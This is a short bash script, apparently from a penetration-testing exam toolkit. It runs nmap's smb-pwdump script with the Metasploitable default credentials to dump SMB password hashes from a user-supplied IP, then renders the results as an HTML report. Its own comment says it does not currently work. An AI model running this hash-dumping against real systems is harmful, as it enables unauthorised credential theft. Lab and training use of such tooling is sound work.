#!/bin/bash

# requires the smb-pwdump.nse to be downloaded from:
# https://svn.nmap.org/nmap-exp/dev/nmap/scripts/smb-pwdump.nse?p=25000
# Note: not currently working, theres an issue with an smb return

printf "[+] Checking smb hashes with smb-pwdump NSE script over $ip...\n"
printf "Note: This may close the port\n"
printf "Enter IP: "
read ip

  nmap -vv -p 135,139,445 --script=smb-pwdump.nse --script-args=smbuser=msfadmin,smbpass=msfadmin \
  -oX /root/exam/nmap_scans/$ip/smb_nse_pwdump.xml $ip && xsltproc /root/exam/nmap_scans/$ip/smb_nse_pwdump.xml \
  -o /root/exam/nmap_scans/$ip/smb_nse_pwdump_report.html

  firefox /root/exam/nmap_scans/$ip/smb_nse_pwdump_report.html
  sleep 5;
exit